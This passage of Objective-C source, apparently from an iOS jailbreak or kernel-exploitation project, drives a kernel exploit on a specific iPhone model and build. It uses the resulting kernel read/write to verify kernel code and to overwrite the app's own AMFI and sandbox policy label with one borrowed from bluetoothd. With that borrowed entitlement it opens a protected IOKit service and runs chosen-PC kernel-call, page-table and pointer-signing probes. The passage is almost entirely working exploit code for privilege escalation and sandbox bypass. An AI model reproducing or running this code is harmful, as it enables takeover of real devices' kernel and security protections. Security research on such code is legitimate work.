        @"completeSignerSetFound": @NO,
        @"reportPath": reportPath,
        @"state": @"starting",
    } mutableCopy];
    CNDPhysicalKCall1Persist(report, reportPath, nil, nil);

    if (![report[@"productType"]
            isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_PRODUCT] ||
        ![report[@"productBuildVersion"]
            isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_BUILD]) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-unsupported-device");
        return report;
    }

    CNDPhysicalKCall1KernelAPI kernel = {0};
    CNDPhysicalKCall1IOKitAPI iokit = {0};
    if (!CNDPhysicalKCall1ResolveReadOnlyKernelAPI(&kernel) ||
        !CNDPhysicalKCall1ResolveReadOnlyIOKitAPI(&iokit)) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-read-only-api-unavailable");
        if (iokit.handle != NULL) dlclose(iokit.handle);
        return report;
    }
    if (!kernel.krwReady()) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-krw-not-ready");
        dlclose(iokit.handle);
        return report;
    }

    uint64_t kernelBase = *kernel.kernelBase;
    uint64_t slide = *kernel.kernelSlide;
    report[@"kernelBase"] = CNDPhysicalKCall1Hex(kernelBase);
    report[@"kernelSlide"] = CNDPhysicalKCall1Hex(slide);
    bool baseValid =
        kernelBase == CNDPhysicalKCall1StaticKernelBase + slide &&
        slide <= CND_PHYSICAL_KCALL1_SLIDE_MAX &&
        (slide & UINT64_C(0x3fff)) == 0;
    report[@"kernelBaseMatchesContainer"] = @(baseValid);
    struct mach_header_64 header = {0};
    bool headerValid = baseValid && CNDPhysicalKCall1ReadBytes(
        &kernel, kernelBase, &header, sizeof(header)) &&
        header.magic == MH_MAGIC_64 && header.filetype == MH_FILESET;
    report[@"kernelHeaderMagic"] = CNDPhysicalKCall1Hex(header.magic);
    report[@"kernelHeaderFiletype"] = @(header.filetype);
    if (!headerValid) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-kernel-identity");
        dlclose(iokit.handle);
        return report;
    }

    uint64_t stockTarget = CNDPhysicalKCall1StaticEtherCheckMulti + slide;
    uint64_t apfsTarget = CNDPhysicalKCall1StaticAPFSX1Dispatcher + slide;
    uint64_t getPTETarget = CNDPhysicalKCall1StaticIOUATGetPTE + slide;
    uint64_t outerTarget =
        CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide;
    uint64_t signerAddress =
        CNDPhysicalKCall1StaticCheckMultiSigner + slide;
    uint32_t signerInstructions[3] = {0};
    uint32_t apfsInstructions[4] = {0};
    uint32_t getPTEInstructions[8] = {0};
    uint32_t outerInstructions[7] = {0};
    bool signerExact = CNDPhysicalKCall1ReadBytes(&kernel,
            signerAddress - sizeof(uint32_t), signerInstructions,
            sizeof(signerInstructions)) &&
        memcmp(signerInstructions,
            CNDPhysicalKCall1ExpectedCheckMultiSigner,
            sizeof(signerInstructions)) == 0;
    bool apfsExact = CNDPhysicalKCall1ReadBytes(&kernel, apfsTarget,
            apfsInstructions, sizeof(apfsInstructions)) &&
        memcmp(apfsInstructions,
            CNDPhysicalKCall1ExpectedAPFSX1Dispatcher,
            sizeof(apfsInstructions)) == 0;
    bool getPTEExact = CNDPhysicalKCall1ReadBytes(&kernel, getPTETarget,
            getPTEInstructions, sizeof(getPTEInstructions)) &&
        memcmp(getPTEInstructions, CNDPhysicalKCall1ExpectedIOUATGetPTE,
            sizeof(getPTEInstructions)) == 0;
    bool outerExact = CNDPhysicalKCall1ReadBytes(&kernel, outerTarget,
            outerInstructions, sizeof(outerInstructions)) &&
        memcmp(outerInstructions, CNDPhysicalKCall1ExpectedDispatcher,
            sizeof(outerInstructions)) == 0;
    bool codeWitnessesExact = signerExact && apfsExact &&
        getPTEExact && outerExact;
    report[@"stockTarget"] = CNDPhysicalKCall1Hex(stockTarget);
    report[@"apfsTarget"] = CNDPhysicalKCall1Hex(apfsTarget);
    report[@"getPTETarget"] = CNDPhysicalKCall1Hex(getPTETarget);
    report[@"outerTarget"] = CNDPhysicalKCall1Hex(outerTarget);
    report[@"signerAddress"] = CNDPhysicalKCall1Hex(signerAddress);
    report[@"signerSequenceExact"] = @(signerExact);
    report[@"apfsInstructionsExact"] = @(apfsExact);
    report[@"getPTEInstructionsExact"] = @(getPTEExact);
    report[@"outerInstructionsExact"] = @(outerExact);
    report[@"codeWitnessesExact"] = @(codeWitnessesExact);
    if (!codeWitnessesExact) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-code-witness-mismatch");
        dlclose(iokit.handle);
        return report;
    }

    const size_t dispatcherCount =
        sizeof(CNDPhysicalKCall1GlobalDispatchers) /
        sizeof(CNDPhysicalKCall1GlobalDispatchers[0]);
    uint64_t initialSlots[sizeof(CNDPhysicalKCall1GlobalDispatchers) /
        sizeof(CNDPhysicalKCall1GlobalDispatchers[0])] = {0};
    bool initialSlotReads[sizeof(CNDPhysicalKCall1GlobalDispatchers) /
        sizeof(CNDPhysicalKCall1GlobalDispatchers[0])] = {0};
    NSMutableArray<NSMutableDictionary<NSString *, id> *> *dispatchers =
        [NSMutableArray array];
    NSUInteger idleDispatcherCount = 0;
    for (size_t index = 0; index < dispatcherCount; index++) {
        const CNDPhysicalKCall1GlobalDispatcher *candidate =
            &CNDPhysicalKCall1GlobalDispatchers[index];
        uint64_t target = candidate->target + slide;
        uint64_t slot = candidate->slot + slide;
        uint8_t family = (uint8_t)((target >> 8) & 0xff);
        uint32_t instructions[7] = {0};
        bool familyOK = family == AF_UNSPEC || family == AF_LINK;
        bool instructionsExact = familyOK &&
            CNDPhysicalKCall1ReadBytes(&kernel, target, instructions,
                sizeof(instructions)) &&
            memcmp(instructions, candidate->instructions,
                sizeof(instructions)) == 0;
        initialSlotReads[index] = CNDPhysicalKCall1ReadU64(
            &kernel, slot, &initialSlots[index]);
        bool idle = familyOK && instructionsExact &&
            initialSlotReads[index] && initialSlots[index] == 0;
        if (idle) idleDispatcherCount++;
        [dispatchers addObject:[@{
            @"name": [NSString stringWithUTF8String:candidate->name]
                ?: @"",
            @"target": CNDPhysicalKCall1Hex(target),
            @"slot": CNDPhysicalKCall1Hex(slot),
            @"sockaddrFamily": @(family),
            @"familyAccepted": @(familyOK),
            @"instructionsExact": @(instructionsExact),
            @"initialSlotRead": @(initialSlotReads[index]),
            @"initialSlotValue": CNDPhysicalKCall1Hex(initialSlots[index]),
            @"initialSlotIdle": @(idle),
        } mutableCopy]];
    }
    report[@"globalDispatcherCandidates"] = dispatchers;
    report[@"idleDispatcherCount"] = @(idleDispatcherCount);

    uint64_t uatGlobal = CNDPhysicalKCall1StaticIOUATGlobal + slide;
    uint64_t objectRaw = 0, recordRaw = 0, objectRecordRaw = 0;
    bool ownerRead = CNDPhysicalKCall1ReadU64(
            &kernel, uatGlobal + 0x28, &objectRaw) &&
        CNDPhysicalKCall1ReadU64(
            &kernel, uatGlobal + 0x18, &recordRaw);
    uint64_t object = CNDPhysicalKCall1StripDataPointer(objectRaw);
    uint64_t record = CNDPhysicalKCall1StripDataPointer(recordRaw);
    if (ownerRead && CNDPhysicalKCall1KernelObject(object)) {
        ownerRead = CNDPhysicalKCall1ReadU64(
            &kernel, object + 0x20, &objectRecordRaw);
    }
    uint64_t objectRecord =
        CNDPhysicalKCall1StripDataPointer(objectRecordRaw);
    bool ownerJoin = ownerRead && CNDPhysicalKCall1KernelObject(object) &&
        CNDPhysicalKCall1KernelObject(record) && objectRecord == record;
    report[@"uatGlobal"] = CNDPhysicalKCall1Hex(uatGlobal);
    report[@"uatObjectRaw"] = CNDPhysicalKCall1Hex(objectRaw);
    report[@"uatObject"] = CNDPhysicalKCall1Hex(object);
    report[@"uatGlobalRecord"] = CNDPhysicalKCall1Hex(record);
    report[@"uatObjectRecord"] = CNDPhysicalKCall1Hex(objectRecord);
    report[@"uatOwnerJoin"] = @(ownerJoin);
    if (!ownerJoin) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-owner-binding-mismatch");
        dlclose(iokit.handle);
        return report;
    }

    uint64_t selfTask = kernel.taskSelf();
    report[@"selfTask"] = CNDPhysicalKCall1Hex(selfTask);
    if (!CNDPhysicalKCall1KernelObject(selfTask)) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-self-task");
        dlclose(iokit.handle);
        return report;
    }

    NSMutableSet<NSString *> *seenRegistryIDs = [NSMutableSet set];
    NSMutableArray<NSDictionary<NSString *, id> *> *entries =
        [NSMutableArray array];
    NSMutableDictionary<NSString *, NSNumber *> *roleCounts =
        [@{ @"stock": @0, @"apfs-x1": @0, @"idam-global": @0,
             @"get-pte": @0, @"outer-x0": @0 } mutableCopy];
    NSMutableArray<NSDictionary<NSString *, id> *> *queryResults =
        [NSMutableArray array];
    BOOL truncated = NO;
    CNDPhysicalKCall1InventoryClass(&kernel, &iokit, selfTask, slide,
        "IONetworkInterface", seenRegistryIDs, entries, roleCounts,
        queryResults, &truncated);
    CNDPhysicalKCall1InventoryClass(&kernel, &iokit, selfTask, slide,
        "IOUserEthernetInterface", seenRegistryIDs, entries, roleCounts,
        queryResults, &truncated);

    bool slotsStable = true;
    for (size_t index = 0; index < dispatcherCount; index++) {
        const CNDPhysicalKCall1GlobalDispatcher *candidate =
            &CNDPhysicalKCall1GlobalDispatchers[index];
        uint64_t finalValue = 0;
        bool finalRead = CNDPhysicalKCall1ReadU64(
            &kernel, candidate->slot + slide, &finalValue);
        bool stable = initialSlotReads[index] && finalRead &&
            finalValue == initialSlots[index];
        slotsStable = slotsStable && stable;
        dispatchers[index][@"finalSlotRead"] = @(finalRead);
        dispatchers[index][@"finalSlotValue"] =
            CNDPhysicalKCall1Hex(finalValue);
        dispatchers[index][@"slotStable"] = @(stable);
    }

    NSUInteger unreadInterfaceCount = 0;
    for (NSDictionary<NSString *, id> *entry in entries) {
        if (![entry[@"fieldsRead"] boolValue]) unreadInterfaceCount++;
    }
    bool queriesSucceeded = queryResults.count == 2;
    for (NSDictionary<NSString *, id> *query in queryResults) {
        queriesSucceeded = queriesSucceeded &&
            [query[@"result"] unsignedIntValue] == KERN_SUCCESS;
    }
    bool inventoryComplete = slotsStable && queriesSucceeded &&
        !truncated && unreadInterfaceCount == 0;
    bool completeSignerSet = inventoryComplete &&
        [roleCounts[@"stock"] unsignedIntegerValue] > 0 &&
        [roleCounts[@"apfs-x1"] unsignedIntegerValue] > 0 &&
        [roleCounts[@"idam-global"] unsignedIntegerValue] > 0 &&
        [roleCounts[@"get-pte"] unsignedIntegerValue] > 0 &&
        [roleCounts[@"outer-x0"] unsignedIntegerValue] > 0;
    report[@"interfaceQueries"] = queryResults;
    report[@"interfaces"] = entries;
    report[@"interfaceCount"] = @(entries.count);
    report[@"inventoryLimit"] =
        @(CNDPhysicalKCall1SignerInventoryMaxInterfaces);
    report[@"inventoryTruncated"] = @(truncated);
    report[@"unreadInterfaceCount"] = @(unreadInterfaceCount);
    report[@"interfaceQueriesSucceeded"] = @(queriesSucceeded);
    report[@"roleCounts"] = roleCounts;
    report[@"globalSlotsStable"] = @(slotsStable);
    report[@"inventoryComplete"] = @(inventoryComplete);
    report[@"completeSignerSetFound"] = @(completeSignerSet);
    NSString *result = !inventoryComplete
        ? @"inconclusive-incomplete-interface-inventory"
        : (completeSignerSet ? @"found-complete-existing-signer-set"
                             : @"no-complete-existing-signer-set");
    CNDPhysicalKCall1Persist(report, reportPath, @"result", result);
    dlclose(iokit.handle);
    return report;
}

static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(
    CNDPhysicalKCall1ProbeMode mode)
{
    BOOL uatPTE = mode == CNDPhysicalKCall1ProbeModeUatPTE;
    BOOL signerOracle = mode == CNDPhysicalKCall1ProbeModeSignerOracle;
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *reportPath = [directory stringByAppendingPathComponent:
        uatPTE ? @"CNDPhysicalKCall1UatPTEProbe.json" :
        (signerOracle ? @"CNDPhysicalKCall1SignerOracle.json"
                      : @"CNDPhysicalKCall1Probe.json")];
    NSMutableDictionary<NSString *, id> *report =
        [@{
            @"schema": uatPTE
                ? @"com.zeroxjf.cyanide.physical-kcall1-uat-pte-probe" :
                (signerOracle
                    ? @"com.zeroxjf.cyanide.physical-kcall1-signer-oracle"
                    : @"com.zeroxjf.cyanide.physical-kcall1-probe"),
            @"schemaVersion": @1,
            @"productType": CNDPhysicalKCall1SysctlString("hw.machine"),
            @"productBuildVersion":
                CNDPhysicalKCall1SysctlString("kern.osversion"),
            @"donorProcess": @"bluetoothd",
            @"requiredEntitlement":
                @"com.apple.networking.ethernet.user-access",
            @"kernelReadUsed": @YES,
            @"kernelWriteUsed": @NO,
            @"kernelCallUsed": @(uatPTE),
            @"krwAcquisitionAttempted": @NO,
            @"krwCleanupAttempted": @NO,
            @"providerUsed": @NO,
            @"krwSource": @"app kexploit (kreadbuf/kwrite64, "
                "kexploit_early_kwrite32bytes_checked)",
            @"baseSource": @"g_kernel_base / g_kernel_slide",
            @"borrowedPolicies": @[
                @"AMFI OSEntitlements @ label+0x8",
                @"Seatbelt sandbox @ label+0x10",
            ],
            @"labelWriteScope":
                @"self MAC label base, exactly 0x20 physical bytes",
            @"canary": uatPTE
                ? @"mediated IOUAT getPageTableEntry over a live Metal VA" :
                (signerOracle
                    ? @"single non-triggering IA/e4fe signer-oracle validation"
                    : @"ifnet kcall1 chosen-PC/chosen-X0"),
            @"ifnetKCall1Success": @NO,
            @"uatPTESuccess": @NO,
            @"signerOracleSuccess": @NO,
            @"reportPath": reportPath,
            @"state": @"starting",
        } mutableCopy];
    CNDPhysicalKCall1Persist(report, reportPath, nil, nil);

    NSString *product = report[@"productType"];
    NSString *build = report[@"productBuildVersion"];
    if (![product isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_PRODUCT] ||
        ![build isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_BUILD]) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"result", @"refused-unsupported-device");
        return report;
    }

    CNDPhysicalKCall1KernelAPI kernel = {0};
    CNDPhysicalKCall1IOKitAPI iokit = {0};
    if (!CNDPhysicalKCall1ResolveKernelAPI(&kernel) ||
        !CNDPhysicalKCall1ResolveIOKitAPI(&iokit)) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"result", @"refused-api-unavailable");
        if (iokit.handle != NULL) dlclose(iokit.handle);
        return report;
    }

    /* Same ordering trap as the entitlement-audit probe: the slot offsets only
     * exist after offsets.m has run, and offsets_init() is called from inside
     * kexploit (kexploit_opa334.m:3121) / persistence.m:640, not at process
     * start.  A headless launch would otherwise refuse with
     * `refused-label-slot-mismatch` on both offsets reading 0.  This call
     * touches no kernel state (userland version + hw.cpufamily switch) and
     * still happens before the exploit is asked for anything. */
    if (*kernel.amfiSlotOffset == 0 || *kernel.sandboxSlotOffset == 0) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"state", @"initializing-offsets");
        kernel.offsetsInit();
        report[@"offsetsInitCalled"] = @YES;
    } else {
        report[@"offsetsInitCalled"] = @NO;
    }

    report[@"amfiSlotOffset"] = @(*kernel.amfiSlotOffset);
    report[@"sandboxSlotOffset"] = @(*kernel.sandboxSlotOffset);
    if (*kernel.amfiSlotOffset != CNDPhysicalKCall1AMFISlotOffset ||
        *kernel.sandboxSlotOffset != CNDPhysicalKCall1SandboxSlotOffset) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-label-slot-mismatch");
        dlclose(iokit.handle);
        return report;
    }

    bool initiallyReady = kernel.krwReady();
    report[@"krwInitiallyReady"] = @(initiallyReady);
    bool acquired = false;
    if (!initiallyReady && signerOracle) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-preexisting-krw-required");
        dlclose(iokit.handle);
        return report;
    }
    if (!initiallyReady) {
        report[@"krwAcquisitionAttempted"] = @YES;
        CNDPhysicalKCall1Persist(
            report, reportPath, @"state", @"acquiring-physical-krw");
        int exploitResult = kernel.kexploit();
        report[@"kexploitResult"] = @(exploitResult);
        acquired = true;
    }
    bool ready = kernel.krwReady();
    report[@"krwValidated"] = @(ready);
    if (!ready) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"result", @"refused-krw-not-ready");
        dlclose(iokit.handle);
        return report;
    }

    uint64_t kernelBase = *kernel.kernelBase;
    uint64_t slide = *kernel.kernelSlide;
    report[@"kernelBase"] = CNDPhysicalKCall1Hex(kernelBase);
    report[@"kernelSlide"] = CNDPhysicalKCall1Hex(slide);
    bool baseMatches =
        kernelBase == CNDPhysicalKCall1StaticKernelBase + slide;
    bool filesetMatches =
        kernelBase == CNDPhysicalKCall1StaticFilesetEntry + slide;
    report[@"kernelBaseMatchesContainer"] = @(baseMatches);
    report[@"kernelBaseMatchesFilesetEntry"] = @(filesetMatches);
    if (!baseMatches || slide > CND_PHYSICAL_KCALL1_SLIDE_MAX ||
        (slide & UINT64_C(0x3fff)) != 0) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"result", @"refused-base-mismatch");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        dlclose(iokit.handle);
        return report;
    }

    /* The base really is the pinned kernel image: the app's own base plus
     * the mach header there must be the container's MH_MAGIC_64/MH_FILESET
     * (phone-kernelcache-header.txt:6-10). */
    struct mach_header_64 header = {0};
    bool headerRead = CNDPhysicalKCall1ReadBytes(
        &kernel, kernelBase, &header, sizeof(header));
    report[@"kernelHeaderMagic"] =
        CNDPhysicalKCall1Hex(header.magic);
    report[@"kernelHeaderFiletype"] = @(header.filetype);
    if (!headerRead || header.magic != MH_MAGIC_64 ||
        header.filetype != MH_FILESET) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"result", @"refused-kernel-header");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        dlclose(iokit.handle);
        return report;
    }

    uint64_t selfTask = kernel.taskSelf();
    report[@"selfTask"] = CNDPhysicalKCall1Hex(selfTask);
    if (!CNDPhysicalKCall1KernelObject(selfTask)) {
        CNDPhysicalKCall1Persist(
            report, reportPath, @"result", @"refused-self-task");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        dlclose(iokit.handle);
        return report;
    }

    NSArray *before = CNDPhysicalKCall1Interfaces(
        &kernel, &iokit, selfTask, nil);
    io_service_t resource = iokit.getMatchingService(
        MACH_PORT_NULL, iokit.serviceMatching("IOUserEthernetResource"));
    io_connect_t baselineConnection = IO_OBJECT_NULL;
    kern_return_t baselineOpenKR = MACH_PORT_VALID(resource)
        ? iokit.serviceOpen(resource, mach_task_self(), 0,
            &baselineConnection)
        : KERN_NOT_FOUND;
    if (MACH_PORT_VALID(baselineConnection)) {
        (void)iokit.serviceClose(baselineConnection);
    }
    report[@"baselineOpenKR"] = CNDPhysicalKCall1Hex(
        (uint32_t)baselineOpenKR);
    if (!MACH_PORT_VALID(resource) || baselineOpenKR == KERN_SUCCESS) {
        if (MACH_PORT_VALID(resource)) (void)iokit.objectRelease(resource);
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            baselineOpenKR == KERN_SUCCESS
                ? @"baseline-unexpectedly-authorized" : @"resource-missing");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        dlclose(iokit.handle);
        return report;
    }

    /* Resolve both labels only after the negative open has completed. */
    uint64_t targetProc = kernel.procSelf();
    uint64_t donorProc = kernel.procFindByName("bluetoothd");
    report[@"targetProc"] = CNDPhysicalKCall1Hex(targetProc);
    report[@"donorProc"] = CNDPhysicalKCall1Hex(donorProc);
    report[@"labelResolvedAfterBaseline"] = @YES;
    CNDPhysicalKCall1Borrow borrow = {0};
    bool installed = CNDPhysicalKCall1PrepareBorrow(
        &kernel, donorProc, targetProc, &borrow);
    report[@"targetLabel"] = CNDPhysicalKCall1Hex(borrow.targetLabel);
    report[@"donorLabel"] = CNDPhysicalKCall1Hex(borrow.donorLabel);
    report[@"originalAMFIObject"] =
        CNDPhysicalKCall1Hex(borrow.originalAMFIObject);
    report[@"donorAMFIObject"] =
        CNDPhysicalKCall1Hex(borrow.donorAMFIObject);
    report[@"originalSandboxObject"] =
        CNDPhysicalKCall1Hex(borrow.originalSandboxObject);
    report[@"donorSandboxObject"] =
        CNDPhysicalKCall1Hex(borrow.donorSandboxObject);
    report[@"kernelWriteUsed"] = @(borrow.writeAttempted);
    report[@"labelWriteAccepted"] = @(borrow.writeAccepted);
    report[@"labelWriteErrno"] = @(borrow.writeError);
    report[@"labelChangedAfterWrite"] = @(borrow.labelChanged);
    report[@"labelMatchesDesiredAfterWrite"] =
        @(borrow.labelMatchesDesired);
    report[@"labelAfterWriteCaptured"] = @(borrow.labelAfterWriteCaptured);
    if (borrow.captured) {
        NSMutableString *before = [NSMutableString string];
        for (size_t index = 0; index < CNDPhysicalKCall1LabelSize; index++) {
            [before appendFormat:@"%02x", borrow.originalLabel[index]];
        }
        report[@"labelBytesBeforeWrite"] = before;
    }
    if (borrow.labelAfterWriteCaptured) {
        NSMutableString *after = [NSMutableString string];
        for (size_t index = 0; index < CNDPhysicalKCall1LabelSize; index++) {
            [after appendFormat:@"%02x", borrow.labelAfterWrite[index]];
        }
        report[@"labelBytesAfterWrite"] = after;
    }
    CNDPhysicalKCall1Persist(
        report, reportPath, @"borrowInstalled", @(installed));
    if (!installed) {
        report[@"borrowRestored"] = @(borrow.restored);
        (void)iokit.objectRelease(resource);
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            borrow.writeAttempted && !borrow.restored
                ? @"critical-label-restore-failed" : @"refused-label-borrow");
        if (acquired && borrow.restored) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        dlclose(iokit.handle);
        return report;
    }

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t borrowedOpenKR = iokit.serviceOpen(
        resource, mach_task_self(), 0, &connection);
    bool restored = CNDPhysicalKCall1RestoreBorrow(&kernel, &borrow);
    report[@"borrowedOpenKR"] = CNDPhysicalKCall1Hex(
        (uint32_t)borrowedOpenKR);
    report[@"borrowRestored"] = @(restored);
    report[@"restoreWholeLabelExact"] = @(restored);
    CNDPhysicalKCall1Persist(report, reportPath, @"state",
        restored ? @"label-restored-before-selector"
                 : @"critical-label-restore-failed");
    (void)iokit.objectRelease(resource);
    if (!restored) {
        if (MACH_PORT_VALID(connection)) {
            (void)iokit.serviceClose(connection);
        }
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"critical-label-restore-failed");
        dlclose(iokit.handle);
        return report;
    }
    if (borrowedOpenKR != KERN_SUCCESS || !MACH_PORT_VALID(connection)) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-entitlement-gated-open");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        dlclose(iokit.handle);
        return report;
    }
    report[@"selectorInvokedAfterRestore"] = @YES;

    NSMutableSet<NSString *> *knownIDs = [NSMutableSet set];
    for (NSDictionary *entry in before) {
        NSString *identifier = entry[@"registryID"];
        if ([identifier isKindOfClass:[NSString class]]) {
            [knownIDs addObject:identifier];
        }
    }
    report[@"interfacesBefore"] = before;

    NSArray *after = nil;
    kern_return_t lastCallKR = KERN_FAILURE;
    uint64_t lastControllerCookie = 0;
    bool criticalRestoreFailure = false;
    CNDPhysicalKCall1SignedInterface oracleCreated = {0};
    int canaryResult = signerOracle
        ? CNDPhysicalKCall1RunSignerOracle(&kernel, &iokit, slide,
            connection, selfTask, knownIDs, report, &after, &lastCallKR,
            &lastControllerCookie, &oracleCreated, &criticalRestoreFailure)
        : (uatPTE
            ? CNDPhysicalKCall1RunUatPTE(&kernel, &iokit, slide,
            connection, selfTask, knownIDs, report, &after, &lastCallKR,
            &lastControllerCookie, &criticalRestoreFailure)
            : CNDPhysicalKCall1RunCanary(&kernel, &iokit, slide,
            connection, selfTask, knownIDs, report, &after, &lastCallKR,
            &lastControllerCookie, &criticalRestoreFailure));
    report[@"callKR"] = CNDPhysicalKCall1Hex((uint32_t)lastCallKR);
    report[@"controllerCookie"] =
        CNDPhysicalKCall1Hex(lastControllerCookie);
    if (after != nil) report[@"interfacesAfter"] = after;

    kern_return_t closeKR = MACH_PORT_VALID(connection)
        ? iokit.serviceClose(connection) : KERN_INVALID_NAME;
    connection = IO_OBJECT_NULL;
    report[@"connectionCloseKR"] =
        CNDPhysicalKCall1Hex((uint32_t)closeKR);

    BOOL teardownObserved = !signerOracle;
    if (signerOracle) {
        teardownObserved = oracleCreated.registryID == 0;
        NSArray *afterClose = nil;
        for (unsigned int attempt = 0;
             !teardownObserved &&
                 attempt < CND_PHYSICAL_KCALL1_MAX_POLLS; attempt++) {
            afterClose = CNDPhysicalKCall1Interfaces(
                &kernel, &iokit, selfTask, nil);
            NSString *createdID =
                CNDPhysicalKCall1Hex(oracleCreated.registryID);
            BOOL present = NO;
            for (NSDictionary *entry in afterClose) {
                if ([entry[@"registryID"] isEqualToString:createdID]) {
                    present = YES;
                    break;
                }
            }
            teardownObserved = !present;
            if (!teardownObserved &&
                attempt + 1 < CND_PHYSICAL_KCALL1_MAX_POLLS) {
                usleep(CND_PHYSICAL_KCALL1_POLL_INTERVAL_US);
            }
        }
        if (afterClose != nil) report[@"interfacesAfterClose"] = afterClose;
        report[@"signerOracleTeardownObserved"] = @(teardownObserved);
        report[@"signerOracleConnectionClosed"] =
            @(closeKR == KERN_SUCCESS);
        BOOL oracleSuccess = canaryResult == 0 &&
            [report[@"signerOracleSuccessBeforeTeardown"] boolValue] &&
            closeKR == KERN_SUCCESS && teardownObserved &&
            !criticalRestoreFailure;
        report[@"signerOracleSuccess"] = @(oracleSuccess);
        if (!oracleSuccess && canaryResult == 0) canaryResult = EBUSY;
    }

    report[@"criticalRestoreFailure"] = @(criticalRestoreFailure);
    report[@"kcall1Result"] = @(canaryResult);
    if (signerOracle) report[@"signerOracleResult"] = @(canaryResult);

    NSString *successKey = signerOracle ? @"signerOracleSuccess" :
        (uatPTE ? @"uatPTESuccess" : @"ifnetKCall1Success");
    bool success = canaryResult == 0 &&
        [report[successKey] boolValue] && !criticalRestoreFailure;
    NSString *failure = signerOracle
        ? @"signer-oracle-validation-failed" : @"trigger-failed";
    if (criticalRestoreFailure) {
        failure = @"critical-restore-failure";
    } else if (signerOracle && !teardownObserved) {
        failure = @"signer-oracle-teardown-not-observed";
    } else if ([report[signerOracle ? @"signerOracleSetupResult" :
                            (uatPTE ? @"uatPTESetupResult"
                                    : @"ifnetKCall1SetupResult")]
                            intValue] != 0) {
        /* GOT/stock-pointer or stub bytes refused: nothing was armed. */
        failure = @"canary-setup-refused";
    } else if ([report[signerOracle ? @"signerOracleStageResult" :
                            (uatPTE ? @"uatPTESignerStagesResult"
                                    : @"ifnetKCall1SignerStagesResult")]
                            intValue] != 0) {
        failure = @"canary-stage-refused";
    }
    CNDPhysicalKCall1Persist(report, reportPath, @"result", success
        ? (signerOracle ? @"observed-single-signed-enoexec-callback" :
            (uatPTE ? @"observed-live-metal-pte-low32"
                    : @"physical-krw-kcall1-chosen-pc-chosen-x0"))
        : failure);

    if (acquired) {
        report[@"krwCleanupAttempted"] = @YES;
        report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        CNDPhysicalKCall1Persist(report, reportPath, nil, nil);
    } else {
        report[@"krwLeftOpenBecausePreexisting"] = @YES;
        CNDPhysicalKCall1Persist(report, reportPath, nil, nil);
    }
    dlclose(iokit.handle);
    return report;
}

BOOL CNDPhysicalKCall1ProbeIsSupported(NSString **reasonOut)
{
    NSString *product = CNDPhysicalKCall1SysctlString("hw.machine");
    NSString *build = CNDPhysicalKCall1SysctlString("kern.osversion");
    BOOL supported =
        [product isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_PRODUCT] &&
        [build isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_BUILD];
    if (reasonOut != NULL) {
        *reasonOut = supported
            ? @"Exact iPhone17,2 / 23A341 target matched."
            : [NSString stringWithFormat:
                @"Requires iPhone17,2 / 23A341; observed %@ / %@.",
                product.length ? product : @"unknown",
                build.length ? build : @"unknown"];
    }
    return supported;
}

BOOL CNDPhysicalKCall1ProbeIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDPhysicalKCall1ProbeRunning, 0) != 0;
}

static void CNDPhysicalKCall1ProbeRunMode(
    CNDPhysicalKCall1ProbeMode mode,
    CNDPhysicalKCall1ProbeCompletion completion)
{
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalKCall1ProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The physical kcall1 probe is already running.",
            });
        });
        return;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalKCall1RunOnce(mode);
        __sync_lock_release(&gCNDPhysicalKCall1ProbeRunning);
        /* RunOnce has returned from every path by now, so stamp the terminal
         * state on the report it built.  Without this a finished report keeps
         * carrying its last in-flight state ("initializing-offsets",
         * "acquiring-physical-krw", …) and reads as unfinished, which is what
         * a reader of the JSON sees after the run has ended.  The object
         * RunOnce returns is the mutable dictionary it persisted. */
        if ([report isKindOfClass:NSMutableDictionary.class]) {
            NSMutableDictionary<NSString *, id> *finished =
                (NSMutableDictionary<NSString *, id> *)report;
            CNDPhysicalKCall1Persist(finished, finished[@"reportPath"],
                @"state", @"finished");
        }
